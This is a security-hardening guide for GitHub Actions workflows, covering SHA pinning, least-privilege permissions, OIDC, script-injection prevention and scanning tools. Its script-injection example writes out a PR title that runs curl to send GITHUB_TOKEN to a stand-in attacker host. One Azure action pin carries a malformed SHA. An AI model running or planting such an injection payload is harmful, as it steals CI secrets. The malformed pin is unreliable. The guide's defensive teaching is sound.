# Security Hardening

Comprehensive security guide for GitHub Actions workflows. Threat models, mitigations, and best practices.

---

## Threat Model

### 1. Supply Chain Attacks

**Risk:** Compromised third-party actions execute malicious code in your workflows.

**Real-world incident:** tj-actions/changed-files (March 2025, CVE-2025-30066) — attacker compromised the action, injecting code that exfiltrated CI secrets to workflow logs. Affected thousands of repositories.

**Mitigation:** SHA pinning (see below), Dependabot/Renovate for managed updates, action allow-lists at org level.

### 2. Script Injection

**Risk:** Untrusted data from GitHub event payloads injected directly into `run:` scripts.

**Attack vector:** PR titles, branch names, issue bodies, commit messages — any user-controlled string interpolated into shell commands.

**Mitigation:** Use environment variables instead of direct interpolation.

### 3. Secret Exfiltration

**Risk:** Secrets exposed via workflow logs, artifacts, or network exfiltration.

**Attack vector:** `echo $SECRET` in logs, secrets in uploaded artifacts, network calls to attacker-controlled servers.

**Mitigation:** Secret masking (automatic), audit logging, Harden-Runner network monitoring.

### 4. Privilege Escalation

**Risk:** Overly permissive `permissions` grant unnecessary access to workflows.

**Attack vector:** `permissions: write-all` or default write permissions allow malicious code to modify repo content, create releases, etc.

**Mitigation:** Explicit minimum permissions per job.

### 5. Fork PR Attacks

**Risk:** `pull_request_target` with fork PR code checkout executes untrusted code with secrets.

**Attack vector:** Fork PR modifies build scripts → `pull_request_target` runs modified code with full secret access.

**Mitigation:** Never checkout fork PR code in `pull_request_target`. Use label-based gates. See `triggers-and-events.md`.

---

## SHA Pinning

### Why SHA Over Tags

Tags are **mutable** — a maintainer (or attacker) can move `v4` to point to different code. SHAs are **immutable** — a specific commit hash always refers to the same code.

```yaml
# BAD: Tag can be moved
- uses: actions/checkout@v4

# GOOD: SHA is immutable
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

### Finding SHAs

```bash
# Get SHA for a specific tag
git ls-remote https://github.com/actions/checkout.git refs/tags/v4.2.2
# Output: 11bd71901bbe5b1630ceea73d27597364c9af683

# Or use gh CLI
gh api repos/actions/checkout/git/ref/tags/v4.2.2 --jq '.object.sha'
```

### Automated SHA Updates

Configure Dependabot or Renovate to automatically update SHA pins when new versions are released.

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
    commit-message:
      prefix: "chore(ci)"
    groups:
      github-actions:
        patterns: ["*"]
```

```json
// renovate.json (alternative)
{
  "github-actions": {
    "enabled": true,
    "pinDigests": true
  }
}
```

### Comment Convention

Always add a version comment after the SHA for readability:

```yaml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
- uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af  # v4.1.0
```

---

## Permissions Minimization

### Default Permissions

GitHub's default: `contents: read` and `metadata: read` for all workflows (when `permissions` is specified at workflow or job level). Organization admins can set default to read-only.

### Principle: Explicit Minimum

```yaml
# BEST: Restrict at workflow level, expand per job
permissions: {}  # No permissions by default

jobs:
  lint:
    permissions:
      contents: read  # Only read code
    # ...

  deploy:
    permissions:
      contents: read
      id-token: write   # OIDC
      deployments: write # Deployment status
    # ...
# ...
```

### Permissions Reference by Use Case

| Use Case | Required Permissions |
|----------|---------------------|
| CI (lint, test, build) | `contents: read` |
| PR comment | `pull-requests: write` |
| PR status check | `statuses: write` |
| Create release | `contents: write` |
| Publish package | `packages: write` |
| Deploy to Pages | `pages: write`, `id-token: write` |
| OIDC authentication | `id-token: write` |
| Modify issues | `issues: write` |
| Push commits | `contents: write` |
| Read organization | `organization: read` |
| Delete branch | `contents: write` |
| Create check run | `checks: write` |

### Anti-Patterns

```yaml
# NEVER: grants all write permissions
permissions: write-all

# BAD: unnecessary broad permissions
permissions:
  contents: write
  pull-requests: write
  issues: write
  # When you only need contents: read
```

---

## OIDC Authentication (Passwordless)

### Concept

OpenID Connect (OIDC) allows workflows to request short-lived tokens from cloud providers without storing long-lived secrets. GitHub acts as the identity provider.

### AWS

```yaml
permissions:
  id-token: write
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502  # v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
      aws-region: ap-northeast-1
```

**IAM Role Trust Policy (restrict to specific repo/branch):**

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
    },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
      },
      "StringLike": {
        "token.actions.githubusercontent.com:sub": "repo:org/repo:ref:refs/heads/main"
      }
// ...
```

### GCP

```yaml
steps:
  - uses: google-github-actions/auth@6fc4af4b145ae7821d527454aa9bd537d1f2dc5f  # v2
    with:
      workload_identity_provider: 'projects/123456/locations/global/workloadIdentityPools/github/providers/github'
      service_account: 'github-actions@project-id.iam.gserviceaccount.com'
```

### Azure

```yaml
steps:
  - uses: azure/login@a]65d910e8af852a8061c627c456678983e180302  # v2
    with:
      client-id: ${{ secrets.AZURE_CLIENT_ID }}
      tenant-id: ${{ secrets.AZURE_TENANT_ID }}
      subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
```

### HashiCorp Vault

```yaml
steps:
  - uses: hashicorp/vault-action@v3
    with:
      url: https://vault.example.com
      method: jwt
      role: github-actions
      jwtGithubAudience: https://github.com/org
      secrets: |
        secret/data/deploy api_key | API_KEY ;
```

### OIDC Condition Best Practices

| Condition | Example | Use Case |
|-----------|---------|----------|
| Specific repo | `repo:org/repo:*` | Single repo access |
| Specific branch | `repo:org/repo:ref:refs/heads/main` | Production deploy |
| Specific environment | `repo:org/repo:environment:production` | Environment-gated |
| Any PR | `repo:org/repo:pull_request` | Preview deploys |
| Specific tag | `repo:org/repo:ref:refs/tags/v*` | Release deploys |

---

## Script Injection Prevention

### The Problem

```yaml
# DANGEROUS: Direct interpolation of user-controlled data
- run: echo "PR title: ${{ github.event.pull_request.title }}"
# If PR title is: "; curl attacker.com/exfil?token=$GITHUB_TOKEN"
# This becomes: echo "PR title: "; curl attacker.com/exfil?token=$GITHUB_TOKEN"
```

### The Solution: Environment Variables

```yaml
# SAFE: Pass through environment variable
- name: Process PR
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
    PR_BODY: ${{ github.event.pull_request.body }}
  run: |
    echo "PR title: $PR_TITLE"
    echo "PR body: $PR_BODY"
```

### Untrusted Data Sources

| Source | Risk Level | Example |
|--------|-----------|---------|
| `github.event.pull_request.title` | High | User-controlled |
| `github.event.pull_request.body` | High | User-controlled |
| `github.event.issue.title` | High | User-controlled |
| `github.event.issue.body` | High | User-controlled |
| `github.event.comment.body` | High | User-controlled |
| `github.event.review.body` | High | User-controlled |
| `github.event.discussion.title` | High | User-controlled |
| `github.head_ref` | Medium | Branch name (user-controlled in forks) |
| `github.event.commits[*].message` | Medium | Commit message |
| `github.event.commits[*].author.name` | Medium | Git config value |

### Safe in Expressions (Non-Shell)

```yaml
# SAFE: GitHub expressions don't execute shell commands
- if: contains(github.event.pull_request.title, '[skip ci]')

# SAFE: Used in with: parameters (no shell execution)
- uses: some-action@v1
  with:
    title: ${{ github.event.pull_request.title }}
```

---

## Artifact Attestation and SLSA

### Build Provenance

```yaml
permissions:
  id-token: write
  contents: read
  attestations: write

steps:
  - uses: actions/checkout@v4

  - name: Build
    run: npm run build

  - uses: actions/attest-build-provenance@v2
    with:
      subject-path: 'dist/**'
```

### SLSA Levels in GitHub Actions

| Level | Requirement | GitHub Implementation |
|-------|-------------|----------------------|
| Build L1 | Build process exists | Any GHA workflow |
| Build L2 | Hosted build, signed provenance | `attest-build-provenance` action |
| Build L3 | Hardened build (isolated) | Reusable workflow + attestation |

### SBOM Generation

```yaml
- uses: anchore/sbom-action@v0
  with:
    artifact-name: sbom.spdx.json

- uses: actions/attest-sbom@v1
  with:
    subject-path: 'dist/app'
    sbom-path: 'sbom.spdx.json'
```

### Verification

```bash
# Verify attestation locally
gh attestation verify dist/app.tar.gz --owner org-name
```

---

## Security Scanning Tools

### StepSecurity Harden-Runner

Runtime security monitoring for GitHub Actions runners.

```yaml
steps:
  - uses: step-security/harden-runner@v2
    with:
      egress-policy: audit  # Or 'block' for strict mode
      allowed-endpoints: >
        github.com:443
        registry.npmjs.org:443
        api.github.com:443

  - uses: actions/checkout@v4
  # ... rest of workflow
```

**Capabilities:**
- Network egress monitoring/blocking
- File integrity monitoring
- Process monitoring
- DNS monitoring

### OpenSSF Scorecard

```yaml
# .github/workflows/scorecard.yml
on:
  schedule:
    - cron: '0 2 * * 1'  # Weekly
  push:
    branches: [main]

permissions:
  security-events: write
  id-token: write

jobs:
  scorecard:
    runs-on: ubuntu-latest
    steps:
# ...
```

### Gitleaks (Secret Detection)

```yaml
- uses: gitleaks/gitleaks-action@v2
  env:
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

### Trivy (Vulnerability Scanning)

```yaml
# Filesystem scan
- uses: aquasecurity/trivy-action@master
  with:
    scan-type: 'fs'
    severity: 'CRITICAL,HIGH'
    exit-code: 1  # Fail on findings

# Container image scan
- uses: aquasecurity/trivy-action@master
  with:
    image-ref: 'myapp:latest'
    format: 'sarif'
    output: 'trivy-results.sarif'

- uses: github/codeql-action/upload-sarif@v3
# ...
```

---

## Enterprise Governance

### Organization Actions Policy

Settings → Actions → General:

| Policy | Effect |
|--------|--------|
| Allow all actions | No restriction (risky) |
| Allow select actions | GitHub-created + Verified Creators + specific list |
| Disable actions | No workflows run |

### Recommended: Allow List

```
# Format: OWNER/REPOSITORY@REF
actions/checkout@v4
actions/setup-node@v4
actions/cache@v4
actions/upload-artifact@v4
actions/download-artifact@v4
docker/build-push-action@v6
```

### Fork PR Execution Policy

| Setting | Effect |
|---------|--------|
| Require approval for first-time contributors | Safe default |
| Require approval for all outside collaborators | More restrictive |
| Require approval for all PRs | Most restrictive |

### Default Workflow Permissions

Set at Organization level: Settings → Actions → General → Workflow permissions:
- **Read repository contents and packages permissions** (recommended)
- Allow GitHub Actions to create and approve pull requests: **Off** (unless needed)

---

## Security Checklist

### Per-Workflow

- [ ] `permissions` explicitly declared (not using defaults)
- [ ] All third-party actions pinned to SHA
- [ ] No direct interpolation of untrusted data in `run:`
- [ ] Secrets not echoed to logs
- [ ] `pull_request_target` not used with fork code checkout
- [ ] `concurrency` group set to prevent parallel deploys
- [ ] Appropriate `environment` protection for deployments

### Per-Repository

- [ ] Branch protection enabled on main
- [ ] Required status checks configured
- [ ] Dependabot/Renovate configured for GitHub Actions updates
- [ ] Secret scanning enabled
- [ ] CODEOWNERS includes `.github/workflows/`

### Per-Organization

- [ ] Default workflow permissions set to read-only
- [ ] Actions allow-list configured
- [ ] Fork PR approval policy set
- [ ] OIDC configured for cloud deployments (no long-lived secrets)
- [ ] OpenSSF Scorecard monitoring active
